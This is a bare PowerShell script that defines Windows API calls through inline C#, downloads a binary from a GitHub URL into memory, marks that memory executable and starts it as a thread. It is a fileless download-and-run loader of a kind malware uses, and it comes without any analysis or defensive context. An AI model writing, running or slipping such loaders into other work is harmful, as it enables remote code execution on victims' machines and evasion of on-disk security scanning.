$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

Add-Type $code

$url = "https://raw.githubusercontent.com/bheemasarsa409-ship-it/hello/main/test.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)

$addr = [WinAPI]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)

$hThread = [WinAPI]::CreateThread(0, 0, $addr, 0, 0, 0)
[WinAPI]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
